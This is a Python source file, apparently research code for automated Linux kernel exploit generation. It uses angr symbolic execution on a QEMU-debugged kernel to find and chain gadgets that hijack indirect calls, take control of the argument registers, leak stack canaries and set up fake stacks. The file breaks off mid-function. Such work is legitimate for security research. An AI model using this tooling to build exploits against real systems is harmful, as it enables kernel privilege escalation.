"""
osok version 2
Principles:
1.reuse states as much as possible
"""
import angr
from capstone import *
from angr import concretization_strategies
import claripy
import simuvex
import traceback
from pwn import *
import sys
sys.path.append('/home/ww9210/develop/concolic_execution')
import statebroker
import colorama
import kernelrop
import time
import pickle
import os
from os import listdir
from os.path import isfile, join
import datetime
import time

claripy = claripy
sol = claripy.Solver()

#==========types of lea instruction, enumeration=============
LEA_MEM_TO_REG=21
#============================================================
#==========types of mov instruction, enumeration=============
MOV_MEM_TO_REG=11
MOV_REG_TO_MEM=12
MOV_IMM_TO_REG=13
MOV_IMM_TO_MEM=14
MOV_REG_TO_REG=15
#============================================================

def filter_bad_rip(somestate):
    """
    filter function used when moving exploitable states
    if the rip of the state is user space or is in some symbolic region, return True
    :param somestate:
    :return:
    """
    if somestate.regs.rip.symbolic:
        return False
    ip = sol.eval(somestate.ip, 1)[0]
    if ip in [0xffff880066800000, 0]:
        return True
    if ip < 0x7fffffffffff:
        return True
    return False


def filter_bloom_unreachable(somestate):
    if not somestate.osokplugin.reach_bloom_site:
        return True
    return False


def filter_fork_unreachable(somestate):
    if not somestate.osokplugin.firstly_reach_first_fork_site \
            and not somestate.osokplugin.firstly_reach_second_fork_site:
        return True
    return False


class OneShotExploit(object):
    def __init__(self, kernel_path=None):
        '''
        :param kernel_path: the vmlinux path to the kernel
        '''
        self.kernel_path=kernel_path
        #self.b = angr.Project(kernel_path, support_selfmodifying_code=True)
        if os.path.isfile('angr_project.cache'):
            with open('angr_project.cache','rb') as f:
                print '[+] deserilizing vmlinux from pickle dump'
                self.b = pickle.load(f)
        else:
            self.b = angr.Project(kernel_path)
            with open('angr_project.cache','wb') as f:
                pickle.dump(self.b, f)
        self.r = None
        self.statebroker = statebroker.StateBroker()
        self.claripy = claripy
        self.sol = claripy.Solver()
        self.md = Cs(CS_ARCH_X86, CS_MODE_64)
        self.md.detail = True

    def do_nothing(self, state):
        pass

    def setup(self, gadget_path=None \
            , start_addr=None \
            , debug_qemu_backend=True\
            , function_call_to_disable=None\
            , qemu_port=9210\
            , limit_loop=False\
            , pause_on_each_step=False\
            , add_bloom_instrumentation=True\
            , add_forking_instrumentation=True\
            , add_prologue_instrumentation=True\
            , execution_time_limit=99999\
            , debug_irsb=True\
            , pause_on_read_from_symbolic_address=False\
            , resolve_uninit=True\
            , pause_on_failed_memory_resolving=True\
            , pause_on_finish_memory_loading=False\
            , pause_on_enforce_fork_on_bloom=False\
            , pause_on_prologue_on_fork=False\
            , expected_start_rip=None\
            , extra_module_base=None\
            , extra_module_size=None\
            , first_constraint_func=None\
            , controlled_memory_base=None\
            , controlled_memory_size=None\
            , start_bloom_gadget_index=0\
            , boost_via_reconstraining_with_old_state=True\
            , require_perfect_bloom_gadget=True\
            , serilize_good_bloom_fork_gadget_pair=True\
            , use_controlled_data_concretization=True\
            , has_custom_concretization_strategy=True\
            , explore_smash_gadget=False\
            , dump_good_disclosure_state_discretely=True\
            , dump_good_disclosure_state_together=False\
            , dump_good_smash_state_together=True\
            , use_precomputed_disclosure_state=False\
            , use_precomputed_good_bloom_and_fork_pair=False\
            , fast_path_for_disclosure_state=False\
            , not_saving_unsatisfiable_states=True\
            , consider_rbp_disclosure_prologue_pair=True\
            , inspect_phase_2=False\
            ):
        self.start_addr=start_addr
        self._gadget_path=gadget_path
        self.load_gadgets()  # load gadget from result of IDA-Python
        self.function_call_to_disable = function_call_to_disable
        self.debug_qemu_backend=debug_qemu_backend
        self.qemu_port = qemu_port
        self.limit_loop = limit_loop
        self.pause_on_each_step = pause_on_each_step
        self.add_bloom_instrumentation = add_bloom_instrumentation
        self.add_forking_instrumentation = add_forking_instrumentation
        self.add_prologue_instrumentation = add_prologue_instrumentation
        self.execution_time_limit = execution_time_limit
        self.debug_irsb = debug_irsb
        self.pause_on_read_from_symbolic_address = pause_on_read_from_symbolic_address
        self.resolve_uninit = resolve_uninit
        self.pause_on_failed_memory_resolving = pause_on_failed_memory_resolving
        self.pause_on_finish_memory_loading = pause_on_finish_memory_loading
        self.pause_on_enforce_fork_on_bloom = pause_on_enforce_fork_on_bloom
        self.expected_start_rip = expected_start_rip
        self.extra_module_base = extra_module_base
        self.extra_module_size = extra_module_size
        self.first_constraint_func = first_constraint_func
        self.controlled_memory_base = controlled_memory_base
        self.controlled_memory_size = controlled_memory_size
        self.reach_current_bloom_site = None
        self.reach_current_fork_gadget = None
        self.reach_current_first_fork_site = None
        self.reach_current_second_fork_site = None
        self.good_bloom_gadget = []  # good bloom filter
        self.good_bloom_fork_gadget_pair = []
        self.current_bloom_gadget = None
        self.current_forking_gadget = None
        self.current_prologue_gadget = None
        self.current_smash_gadget = None
        self.current_prologue_signature = None
        self.current_firstly_reached_fork_site = None
        self.start_bloom_gadget_index = start_bloom_gadget_index
        self.boost_via_reconstraining_with_old_state = boost_via_reconstraining_with_old_state
        self.require_perfect_bloom_gadget = require_perfect_bloom_gadget
        self.prologue_disclosure_pairs = None
        self.unsatisfiable_state = []
        self.serilize_good_bloom_fork_gadget_pair = serilize_good_bloom_fork_gadget_pair
        self.first_fork_site_bp = None
        self.pause_on_prologue_on_fork = pause_on_prologue_on_fork
        self.use_controlled_data_concretization = use_controlled_data_concretization
        self.bp_enforce_prologue_to_copy_to_user = None
        self.initial_state = None
        self.has_custom_concretization_strategy = has_custom_concretization_strategy
        self.good_disclosure_state = []
        self.explore_smash_gadget = explore_smash_gadget
        self.dump_good_disclosure_state_discretely = dump_good_disclosure_state_discretely
        self.dump_good_disclosure_state_together = dump_good_disclosure_state_together
        self.use_precomputed_disclosure_state = use_precomputed_disclosure_state
        self.good_smash_states = [ ]
        self.fast_path_for_disclosure_state = fast_path_for_disclosure_state
        self.tmp_good_disclosure_state_number = 0
        self.dump_good_smash_state_together = dump_good_smash_state_together
        self.use_precomputed_good_bloom_and_fork_pair = use_precomputed_good_bloom_and_fork_pair
        self.not_saving_unsatisfiable_states = not_saving_unsatisfiable_states
        self.consider_rbp_disclosure_prologue_pair = consider_rbp_disclosure_prologue_pair
        self.inspect_phase_2 = inspect_phase_2

    def get_initial_state(self\
            , control_memory_base=0xffff880066800000\
            , control_memory_size=0x1000\
            , switch_cpu = True\
            , extra_options = None\
            ):

        start_addr = self.start_addr

        extras = {angr.options.REVERSE_MEMORY_NAME_MAP, \
                    angr.options.TRACK_ACTION_HISTORY, \
                    #angr.options.CONSERVATIVE_READ_STRATEGY, \
                    #angr.options.AVOID_MULTIVALUED_READS, \
                    angr.options.KEEP_IP_SYMBOLIC,\
                    angr.options.CONSTRAINT_TRACKING_IN_SOLVER}
        if extra_options:
            extras.add(extra_options)

        # create new state
        s = self.b.factory.blank_state(addr = self.start_addr, add_options = extras)

        if self.function_call_to_disable is not None:
            for addr in self.function_call_to_disable:
                self.b.hook(addr, self.do_nothing, 5)

        if self.debug_qemu_backend:
            print 'connecting to qemu console'
            self.r = pwnlib.tubes.remote.remote('127.0.0.1', self.qemu_port)
            self.install_context(s)
            self.debug_state(s)
            if switch_cpu:
                self.statebroker.set_cpu_number(self.r, 1) 
                self.install_context(s)
                self.debug_state(s)

            if self.expected_start_rip != None:
                if self.sol.eval(s.regs.rip,1)[0] != self.expected_start_rip:
                    self.statebroker.set_cpu_number(self.r, 0)
                    s = self.install_context(s)
                    self.debug_state(s)
            else:
                opt=raw_input('switch cpu?[N/y]')
                if 'y' in opt or 'Y' in opt:
                    self.statebroker.set_cpu_number(self.r, 0)
                    s = self.install_context(s)
                    self.debug_state(s)


        self.start_time_of_symbolic_execution = time.time()

        s = self.install_context(s)
        self.install_section(s, '.data')
        self.install_section(s, '.bss')
        self.install_section(s, '.brk')
        self.install_extra_module(s)  # install the vulnerable module
        self.install_stack(s)  # install the stack
        self.install_gs(s)  # install the gs
        self.r.close()

        # setting symbolic memory
        for i in range(control_memory_size):
            s.memory.store(control_memory_base + i, s.se.BVS("exp_mem" + str(i), 8), inspect=False)

        return s

    def debug_state(self,state,save_memory=True):
        b = self.b
        try:
            if not save_memory:
                irsb = b.factory.block(state.addr).vex
                cap = b.factory.block(state.addr).capstone
                irsb.pp()
                cap.pp()
        except angr.errors.SimEngineError as e:
            print e.args, e.message
            print 'angr.errors.SimEngineError'
            pass

    def dump_reg(self, state):
        print 'rax:', state.regs.rax, 'r8',state.regs.r8
        print 'rbx:', state.regs.rbx, 'r9',state.regs.r9
        print 'rcx:', state.regs.rcx, 'r10',state.regs.r10
        print 'rdx:', state.regs.rdx, 'r11',state.regs.r11
        print 'rsi:', state.regs.rsi, 'r12',state.regs.r12
        print 'rdi:', state.regs.rdi, 'r13',state.regs.r13
        print 'rsp:', state.regs.rsp, 'r14',state.regs.r14
        print 'rbp:', state.regs.rbp, 'r15',state.regs.r15
        print 'gs:' , state.regs.gs
        return
        
    def debug_simgr(self, simgr, save_memory=True):
        print 'dumping active'
        if not save_memory:
            for state in simgr.stashes['active']:
                self.debug_state(state, save_memory)

    def set_loader_concret_memory_region(self, s, addr, buf, length):
        aligned_addr = addr & 0xfffffffffffff000 
        #self.b.loader.memory.write_bytes(aligned_addr,buf)
        try:
            self.b.loader.memory.add_backer(aligned_addr,buf)
        except ValueError:
            print('ValueError: Address is already backed!')
            pass

    def set_concret_memory_region(self, s, addr, buf, length):
        aligned_addr = addr & 0xfffffffffffff000
        s.memory.store(aligned_addr, buf, inspect = False)
        return

    def install_context(self,s):
        s = self.init_reg_concrete(s)
        return s

    def install_gs(self,s):
        r = self.r
        gs_addr = self.sol.eval(s.regs.gs, 1)[0]
        print 'install gs %x...'%(gs_addr)
        con = self.statebroker.get_a_page(r, gs_addr)
        if con != None:
            self.set_concret_memory_region(s, gs_addr, con, 4096)
        else:
            raw_input('failed to get gs')
        print 'finished installing gs'

    def install_stack(self,s):
        r = self.r
        rsp_addr = self.sol.eval(s.regs.rsp, 1)[0]
        print 'install rsp...'
        con = self.statebroker.get_a_page(r, rsp_addr)
        if con != None:
            self.set_concret_memory_region(s, rsp_addr, con, 4096)
        else:
            raw_input('failed to get stack')
        print 'finished installing stack'

    def install_extra_module(self,s):
        extra_module_base = self.extra_module_base
        extra_module_size = self.extra_module_size
        num_of_pages = extra_module_size/4096 + 1
        for i in range(num_of_pages):
            addr = extra_module_base + i * 4096
            con = self.statebroker.get_a_page(self.r, addr)
            if con != None:
                print 'successfully get a page at:', hex(addr)
                self.set_loader_concret_memory_region(s, addr, con, 4096)
            else:
                raw_input('failed to get a page')
        print 'Finished installing extra modules'
        return 
                
    def init_reg_concrete(self,s):
        #assert self.r != None
        s.regs.rax = s.se.BVV(self.statebroker.get_register(self.r,"rax"), 64)
        s.regs.rbx = s.se.BVV(self.statebroker.get_register(self.r,"rbx"), 64)
        s.regs.rcx = s.se.BVV(self.statebroker.get_register(self.r,"rcx"), 64)
        s.regs.rdx = s.se.BVV(self.statebroker.get_register(self.r,"rdx"), 64)
        s.regs.rsi = s.se.BVV(self.statebroker.get_register(self.r,"rsi"), 64)
        s.regs.rdi = s.se.BVV(self.statebroker.get_register(self.r,"rdi"), 64)
        s.regs.rsp = s.se.BVV(self.statebroker.get_register(self.r,"rsp"), 64)
        s.regs.rbp = s.se.BVV(self.statebroker.get_register(self.r,"rbp"), 64)
        s.regs.r8  = s.se.BVV(self.statebroker.get_register(self.r,"r8" ), 64)
        s.regs.r9  = s.se.BVV(self.statebroker.get_register(self.r,"r9" ), 64)
        s.regs.r10 = s.se.BVV(self.statebroker.get_register(self.r,"r10"), 64)
        s.regs.r11 = s.se.BVV(self.statebroker.get_register(self.r,"r11"), 64)
        s.regs.r12 = s.se.BVV(self.statebroker.get_register(self.r,"r12"), 64)
        s.regs.r13 = s.se.BVV(self.statebroker.get_register(self.r,"r13"), 64)
        s.regs.r14 = s.se.BVV(self.statebroker.get_register(self.r,"r14"), 64)
        s.regs.r15 = s.se.BVV(self.statebroker.get_register(self.r,"r15"), 64)
        s.regs.rip = s.se.BVV(self.statebroker.get_register(self.r,"rip"), 64)
        #s.regs.fs = s.se.BVV(self.statebroker.get_register(self.r,"fs"), 64)
        s.regs.gs = s.se.BVV(self.statebroker.get_register(self.r,"gs"), 64)
        #s.regs.es = s.se.BVV(self.statebroker.get_register(self.r,"es"), 16)
        #s.regs.cs = s.se.BVV(self.statebroker.get_register(self.r,"cs"), 16)
        #s.regs.ss = s.se.BVV(self.statebroker.get_register(self.r,"ss"), 16)
        #s.regs.ds = s.se.BVV(self.statebroker.get_register(self.r,"ds"), 16)
        return s

    def install_section(self,s,name):
        r = self.r
        b = self.b
        section = b.loader.main_object.sections_map[name]
        section_offset = section.vaddr
        section_length = section.memsize
        if section_length % 4096 != 0:
            section_length = ((section_length / 4096) + 1) * 4096
        num_of_page = section_length / 4096
        print 'installing',num_of_page, 'pages of section:', name
        for i in range(num_of_page):
            #print i
            addr = section_offset + i * 4096
            con = self.statebroker.get_a_page(r, addr)
            if con!=None:
                self.set_concret_memory_region(s, addr, con, 4096)
            else:
                raw_input('failed to get_a_page')
        print 'Finished installing section:', name
        return

    def get_prologue_disclosure_pairs(self):
        """
        get paired prologue and disclosure gadget
        :return:
        """
        fake_stack_gadgets = self.fake_stack_gadgets
        disclosure_gadgets = self.disclosure_gadgets
        res = []
        for fake_stack_gadget in fake_stack_gadgets:
            for disclosure_gadget in disclosure_gadgets:
                # have the same number of saved of registers
                if fake_stack_gadget[2] == disclosure_gadget[0]:
                    # has the same canary type and not none
                    if fake_stack_gadget[3] == disclosure_gadget[2] and fake_stack_gadget[3] != '':
                        if fake_stack_gadget[3] == 'rsp' and fake_stack_gadget[4] < disclosure_gadget[1] \
                                and (fake_stack_gadget[4]-disclosure_gadget[1]) == -8:
                                # todo
                                #and (fake_stack_gadget[4]-disclosure_gadget[1])%8 == 0:
                            res.append([fake_stack_gadget, disclosure_gadget])
                        if self.consider_rbp_disclosure_prologue_pair:  # consider rbp disclosure prologue pair
                            if fake_stack_gadget[3]=='rbp' and fake_stack_gadget[4] == disclosure_gadget[1]:
                                if fake_stack_gadget[7] + 8 == disclosure_gadget[6]:
                                    res.append([fake_stack_gadget, disclosure_gadget])
                                # res.append([fake_stack_gadget,disclosure_gadget])
        print('there are %d pairs of gadgets:' % (len(res)))
        return res

    def analyze_disclosure_gadget_data_flow_signature(self, disclosure_gadget):
        interested_opnd = ['rdi', 'edi', 'rsi', 'esi', 'rdx', 'edx']
        data_flow_sig = disclosure_gadget[4]
        reversed_instructions = disclosure_gadget[5]
        hotmap = [0, 0, 0]
        sub_gadget_entry = [0, 0, 0]
        cnt = 1
        for sig in data_flow_sig:
            if sig['type'] == MOV_MEM_TO_REG or sig['type'] == MOV_IMM_TO_REG or sig['type'] == MOV_REG_TO_REG:
                if sig['dst'] in interested_opnd:
                    if sig['dst'] in ['rdi', 'edi']:
                        if not hotmap[0]:
                            sub_gadget_entry[0] = sig['addr']
                            hotmap[0] = cnt
                            cnt += 1
                    elif sig['dst'] in ['rsi', 'esi']:
                        if not hotmap[1]:
                            sub_gadget_entry[1] = sig['addr']
                            hotmap[1] = cnt
                            cnt += 1
                    elif sig['dst'] in ['rdx', 'edx', 'dh', 'dl']:
                        if not hotmap[2]:
                            sub_gadget_entry[2] = sig['addr']
                            hotmap[2] = cnt
                            cnt += 1
                    # print(sig)
        return hotmap, sub_gadget_entry

    def analyze_disclosure_gadget(self, disclosure_gadget):
        saved_registers = disclosure_gadget[0]
        canary_offset = disclosure_gadget[1]
        canary_type = disclosure_gadget[2]
        func_name = disclosure_gadget[3]
        data_flow_sig = disclosure_gadget[4]
        reversed_instructions = disclosure_gadget[5]
        #for instruction in reversed_instructions:
            #head = instruction[0]
            #raw_bytes = instruction[1]
            #capstone_disasm = self.md.disasm(raw_bytes, head)
            #inst = capstone_disasm.next()#only one instruction here
            #mnem = inst.mnemonic
            #op_str = inst.op_str
        hotmap, sub_gadget_entry = self.analyze_disclosure_gadget_data_flow_signature(disclosure_gadget)
        return hotmap, sub_gadget_entry

    def load_gadgets(self):
        disclosure_gadget_path = self._gadget_path+'/res_disclosure.txt'
        fake_stack_gadget_path = self._gadget_path+'/res_fake_stack.txt'
        smash_gadget_path = self._gadget_path+'/res_smash.txt'
        bloom_gadget_path = self._gadget_path+'/bloom_gadget.txt'
        fork_gadget_path = self._gadget_path+'/fork_gadget.txt'

        self.disclosure_gadgets = pickle.load(open(disclosure_gadget_path,'rb'))
        self.fake_stack_gadgets = pickle.load(open(fake_stack_gadget_path,'rb'))
        self.smash_gadgets = pickle.load(open(smash_gadget_path,'rb'))
        self.bloom_gadgets = pickle.load(open(bloom_gadget_path,'rb'))
        self.fork_gadgets = pickle.load(open(fork_gadget_path,'rb'))

    def track_reads(self, state):
        b = self.b
        sol = self.sol
        #print '='*78
        #print 'Read', state.inspect.mem_read_expr, 'from', state.inspect.mem_read_address,\
        #                                'Size', state.inspect.mem_read_length
        if type(state.inspect.mem_read_address)!=long:
            try:
                if self.debug_irsb:
                    #irsb = b.factory.block(state.addr).vex
                    #irsb.pp()
                    pass
                #cap = b.factory.block(state.addr).capstone
                #cap.pp()
                #self.dump_reg(state)
                #print 'uninit: ', state.inspect.mem_read_address.uninitialized,\
                            #'symbolic:', state.inspect.mem_read_address.symbolic
                if state.inspect.mem_read_address.symbolic:
                    #print 'read from symbolic address, primitive found!'
                    if self.pause_on_read_from_symbolic_address:
                        raw_input('wtf read from symbolic address')
                #print 'checking whether memory is uninitialized...'
                t=state.memory.load(state.inspect.mem_read_address, size=1, inspect=False)
                if (t.uninitialized and not state.inspect.mem_read_address.symbolic):
                    print 'memory content uninit: ', t.uninitialized, \
                            'memory content symbolic: ', t.symbolic
                    print '[+] uninitialized memory read found:', state.inspect.mem_read_address
                    print '[+] the uninitialized memory read is at:', hex(state.addr)
                    if self.resolve_uninit:
                        r = None
                        try:
                            r = remote('127.0.0.1', self.qemu_port)
                            addr = self.sol.eval(state.inspect.mem_read_address.get_bytes(0, 8), 1)[0]
                            if self.controlled_memory_base <= addr < (self.controlled_memory_base + \
                                self.controlled_memory_size):
                                r.close()
                                pass
                            else:
                                print '[+] resolving a page containing the address:', hex(addr)
                                con = self.statebroker.get_a_page(r, addr)
                                r.close()
                                if con != None:
                                    self.set_concret_memory_region(state, addr, con, 4096)
                                    print '[+] resolved the uninit with concrete page'
                                else:
                                    print( '[!] failed to resolve the uninit memory')
                                    if self.pause_on_failed_memory_resolving:
                                        for addr in state.history_iterator:
                                            print addr
                                        #import IPython; IPython.embed()
                            if self.pause_on_finish_memory_loading:
                                raw_input('do the read now(continue) <-')
                        except:
                            if r is not None:
                                r.close()
                            print 'failed in resolving'
                            pass
                else:
                    #print 'Memory content does not appear uninitialized'
                    pass

            except (AttributeError, angr.errors.SimMemoryAddressError) as e:
                print e.args, e.message
                print 'wtf track reads'
                self.unsatisfiable_state.append(state.copy())
                #import IPython; IPython.embed()
                #assert(0)

    def track_writes(self, state):
        return

    def get_number_of_bloomed_regs(self, state):
        num=0
        reg_names = ['rax','rbx','rcx','rdx','rdi','rsi','r8','r9']
        bloomed_regs = []
        for reg_name in reg_names:
            #print reg_name
            val = state.registers.load(reg_name)
            if val.symbolic:
                #print reg_name, val
                bloomed_regs.append(reg_name)
            elif val.concrete:
                try:
                    if type(val) == angr.state_plugins.sim_action_object.SimActionObject:
                        val = val.to_claripy()
                    val_number = self.sol.eval(val,1)[0]
                    if val_number >= self.controlled_memory_base and \
                        val_number < self.controlled_memory_base + self.controlled_memory_size:
                        #print reg_name, val
                        bloomed_regs.append(reg_name)
                except:
                    traceback.print_exc()
                    import IPython; IPython.embed()

            #import IPython; IPython.embed()
        #return len(bloomed_regs)
        return bloomed_regs
        
    def get_blooming_gadget_entry_and_site(self, bloom_gadget):
        return bloom_gadget[0], bloom_gadget[2] # entry, site
        
    def check_bloom_regs(self, state):
        print('='*78)
        print('Call instruction at:', state.inspect.function_address)
        print 'lalala'

        current_gadget = self.current_bloom_gadget

        if self.sol.eval(state.ip,1)[0] == current_gadget[2]:  # TODO: isn't check redundent
            self.reach_current_bloom_site = True

        #calculating bloomed registers
        bloomed_regs = self.get_number_of_bloomed_regs(state)
        number_of_bloomed_regs = len(bloomed_regs)
        print('[+] there are %d bloomed regsiters'%(number_of_bloomed_regs))

        if number_of_bloomed_regs >= 3:
            self.good_bloom_gadget.append([self.current_bloom_gadget,state.copy(),bloomed_regs])
            print 'blooming: %s!!!'%(self.current_bloom_gadget[1])
            print bloomed_regs
            #import IPython; IPython.embed()

        if state.regs.rdi.symbolic and state.regs.rsi.symbolic and state.regs.rdx.symbolic:
            self.good_bloom_gadget.append([self.current_bloom_gadget, state.copy(), bloomed_regs])
            print 'perfect blooming! %s'%(self.current_bloom_gadget[1])
            print bloomed_regs
            #import IPython; IPython.embed()
        return

    '''
    def call_check_bloom_regs(self, state):
        print('='*78)
        print('Call instruction at:', state.inspect.function_address)
        print 'lalalala'
        current_gadget = self.current_bloom_gadget

        #calculating bloomed registers
        bloomed_regs = self.get_number_of_bloomed_regs(state)
        number_of_bloomed_regs = len(bloomed_regs)
        print('[+] there are %d bloomed regsiters'%(number_of_bloomed_regs))

        if state.regs.rip.symbolic:
            if self.require_perfect_bloom_gadget:
                if state.regs.rdi.symbolic and state.regs.rsi.symbolic and state.regs.rdx.symbolic:
                    self.good_bloom_gadget.append([self.current_bloom_gadget,state.copy(),bloomed_regs])
                    print 'blooming: %s!!!'%(self.current_bloom_gadget[1])
                    print bloomed_regs
                    self.reach_current_bloom_site = True
            else:
                if number_of_bloomed_regs >= 3:
                    self.good_bloom_gadget.append([self.current_bloom_gadget,state.copy(),bloomed_regs])
                    print 'blooming: %s!!!'%(self.current_bloom_gadget[1])
                    self.reach_current_bloom_site = True
                    print bloomed_regs
        return 
    '''
         
    def instrument_bloom(self, state, bloom_entry, bloom_site, \
                                             bloom_gadget, symbolic_regs=['rdi']):
        #state.inspect.b('instruction', when=angr.BP_BEFORE\
        #state.inspect.b('call', when=angr.BP_BEFORE\
                #, instruction = bloom_site\
                #, action=self.call_check_bloom_regs)
                #, action=self.check_bloom_regs)
        state.inspect.b('mem_read', when=angr.BP_BEFORE, action=self.track_reads)
        state.inspect.b('mem_write', when=angr.BP_BEFORE, action=self.track_writes)
        return 

    def run_bloom_gadget(self, state, bloom_gadget, first_constraint_func = None):
        print bloom_gadget
        self.current_bloom_gadget = bloom_gadget
        self.reach_current_bloom_site=False
        bloom_entry, bloom_site = self.get_blooming_gadget_entry_and_site(bloom_gadget)

        if self.add_bloom_instrumentation:
            self.instrument_bloom(state, bloom_entry, bloom_site, bloom_gadget)

        if first_constraint_func is not None:
            first_constraint_func(state, bloom_entry)

        if self.use_controlled_data_concretization:#use controlled_data_concretization
            self.add_concretization_strategy_controlled_data(state)


        b = self.b
        sol = self.sol
        simgr = b.factory.simgr(state, save_unconstrained=True)
        if self.limit_loop:
            #llimiter = angr.exploration_techniques.LoopLimiter(count=5)
            #simgr.use_technique(llimiter)
            pass
        loop_idx = 0
        seen_bloom_state=False
        while True:
            print '[+] '+str(loop_idx)+' step()'
            self.debug_simgr(simgr)
            try:
                simgr.step()
                print 'inspecting simgr...'
                print simgr.active

                def my_filter_func(somestate):
                    ip = sol.eval(somestate.ip,1)[0]
                    if ip in [0xffff880066800000, 0]:
                        return True
                    if ip < 0x7fffffffffff:
                        return True
                    return False
                simgr.move(from_stash='active', to_stash='deadended', filter_func=my_filter_func)
                #import IPython; IPython.embed()
            except:
                print 'wtf simgr error'
                traceback.print_exc()
                raw_input()
                #import IPython; IPython.embed()
                del simgr
                return

            loop_idx += 1
            if simgr.unconstrained:  # has unconstrained state
                print('[+] dumping unconstrained states')
                for ucstate in simgr.unconstrained:
                    # TODO:does this typical happens when indirect jump e.g jmp rdx?
                    # for addr in ucstate.history_iterator:
                        # print addr
                    xxx = reversed(ucstate.history_iterator)
                    xxx.next()
                    xx = xxx.next()
                    second_to_last_history = xx.addr
                    if bloom_site in self.b.factory.block(ucstate.history.addr).instruction_addrs:
                        # if the unconstrained state is generated from the bloom_site
                        print 'reached current bloom site'
                        self.reach_current_bloom_site = True
                        bloomed_regs = self.get_number_of_bloomed_regs(ucstate)
                        number_of_bloomed_regs = len(bloomed_regs)
                        print('[+] there are %d bloomed regsiters' % (number_of_bloomed_regs))
                        if self.require_perfect_bloom_gadget:
                            if ucstate.regs.rdi.symbolic and ucstate.regs.rsi.symbolic and ucstate.regs.rdx.symbolic:
                                self.good_bloom_gadget.append([self.current_bloom_gadget, ucstate.copy(), bloomed_regs])
                                print 'perfect blooming! %s'%(self.current_bloom_gadget[1])
                                seen_bloom_state = True
                                print bloomed_regs
                        else:
                            if number_of_bloomed_regs >= 3:
                                self.good_bloom_gadget.append([self.current_bloom_gadget, ucstate.copy(), bloomed_regs])
                                seen_bloom_state = True
                                print 'blooming: %s!!!' % (self.current_bloom_gadget[1])
                    elif bloom_site in self.b.factory.block(second_to_last_history).instruction_addrs:
                        # if the unconstrained state is generated from the bloom_site and a call stub
                        print 'reached current bloom site too'
                        self.reach_current_bloom_site = True
                        bloomed_regs = self.get_number_of_bloomed_regs(ucstate)
                        number_of_bloomed_regs = len(bloomed_regs)
                        print('[+] there are %d bloomed regsiters' % number_of_bloomed_regs)
                        if self.require_perfect_bloom_gadget:
                            if ucstate.regs.rdi.symbolic and ucstate.regs.rsi.symbolic and ucstate.regs.rdx.symbolic:
                                self.good_bloom_gadget.append([self.current_bloom_gadget, ucstate.copy(), bloomed_regs])
                                print 'perfect blooming! %s'%(self.current_bloom_gadget[1])
                                seen_bloom_state = True
                                print bloomed_regs
                        else:
                            if number_of_bloomed_regs >= 3:
                                self.good_bloom_gadget.append([self.current_bloom_gadget, ucstate.copy(), bloomed_regs])
                                seen_bloom_state = True
                                print 'blooming: %s!!!' % (self.current_bloom_gadget[1])
                    else:
                        print 'unexpected unconstrained state, removing...'
                        #import IPython; IPython.embed()
                        simgr.unconstrained.remove(ucstate)

                print '[+] end of dumping unconstrainted states'
                print('[+] wtf has unconstrained states')
                # import IPython; IPython.embed()
                if seen_bloom_state:
                    del simgr
                    return

            if self.reach_current_bloom_site is True:
                print('next bloom gadget?')
                del simgr
                return 

            elif loop_idx > 7:
                print('can not reach bloom site in 7 steps, return?')
                del simgr
                return

            if len(simgr.active) == 0:
                print('no active states left, wtf..')
                #import IPython; IPython.embed()
                del simgr
                return

            if self.pause_on_each_step:
                raw_input('step?<-')

        del simgr
        return 

    def multiple_runs_blooming_gadget(self):
        initial_state = self.get_initial_state(switch_cpu=True)  			
        total = len(self.bloom_gadgets)
        for i, bloom_gadget in enumerate(self.bloom_gadgets):
            print '[+] ===== checking %d/%d th bloom gadget... =====' % (i, total)
            # some function should be put in blacklist
            if bloom_gadget[1] == 'udp_v6_early_demux':
                continue
            tmp_state = initial_state.copy()
            self.run_bloom_gadget(tmp_state, bloom_gadget, first_constraint_func=self.first_constraint_func)
            if True:  # TODO check if the current bloom state satisfy our requirement
                del tmp_state

        # get execution time
        current_time = time.time()
        executed_time = current_time-self.start_time_of_symbolic_execution
        print '[+] symbolic execution of blooming gadget takes up to %f seconds'%(executed_time)

        for good_bloom_gadget in self.good_bloom_gadget:
            print good_bloom_gadget
        print 'there are %d good bloom gadget verified by symbolic execution' % (len(self.good_bloom_gadget))
        if not os.path.isfile('good_bloom_gadget.cache'):  # dump bloom gadget
            with open('good_bloom_gadget.cache', 'wb') as f:
                pickle.dump(self.good_bloom_gadget, f, -1)

    def enforce_fork_on_bloom(self,state):
        fork_gadget = self.current_forking_gadget
        fork_entry = fork_gadget[0]
        print('='*78)
        print('Call instruction at:',state.inspect.function_address)
        self.reach_current_bloom_site = True
        state.osokplugin.reach_bloom_site=True
        #import IPython; IPython.embed()
        if state.regs.rip.symbolic:
            print(colorama.Fore.RED + '[+] connecting bloom and fork by adding constraint'\
                    + colorama.Style.RESET_ALL)
            state.add_constraints( state.regs.rip == fork_entry ) #add constraint
            if state.satisfiable():
                pass
            else:
                print('state is not satisfiable')
                self.unsatisfiable_state.append(state.copy())
            if self.pause_on_enforce_fork_on_bloom:
                opt = raw_input('ipython shell? [y/N]')
                if opt == 'y\n':
                    import IPython; IPython.embed()
        else:
            print('concrete call target, just pass..')
            #import IPython; IPython.embed()
            #assert(0)
        return

    def extract_prologue_call_site_signature(self, state):
        """
        extract the data flow signature e.g., rdx rsi rdi at the indirect call in the prologue function
        :param state: the state
        :return: dict of interested register values
        """
        print '[+] extracting prologue call site signatures...'
        signature = dict()
        signature['rdx'] = state.regs.rdx
        signature['rsi'] = state.regs.rsi
        signature['rdi'] = state.regs.rdi
        print 'rdx', state.regs.rdx
        print 'rsi', state.regs.rdi
        print 'rdi', state.regs.rdi
        #import IPython; IPython.embed()
        return signature

    def get_forking_gadget_entry_and_sites(self, fork_gadget):
        #  return entry and first site  and second site
        return fork_gadget[0], fork_gadget[2][0][1], fork_gadget[2][1][1]

    def enter_fork_callback(self, state):
        self.reach_current_fork_gadget = True
        print colorama.Fore.RED + 'enter fork gadget' + colorama.Style.RESET_ALL
        # raw_input('con?')
        # import IPython; IPython.embed()
        return 

    def reach_first_fork_site_callback(self, state):
        """
        callback function at the 1st fork site(1st only means a index, does not necessary mean the site is reached first
        :param state:
        :return:
        """
        #self.reach_current_first_fork_site = True
        state.osokplugin.reach_first_fork_site = True
        print 'reach first fork site'
        # check number of controlled regsiters
        try:
            bloomed_regs = self.get_number_of_bloomed_regs(state)
            number_of_bloomed_regs = len(bloomed_regs)
            print('[+] there are %d controlled regsiters' % number_of_bloomed_regs)
        except:
            traceback.print_exc()
            raw_input()
        # fork
        if state.osokplugin.firstly_reach_first_fork_site and not state.osokplugin.reach_second_fork_site:
            # we reach first fork site for two consecutive times without reaching second fork site
            print 'found good bloom fork pair'
            constraints = list(state.se.constraints)
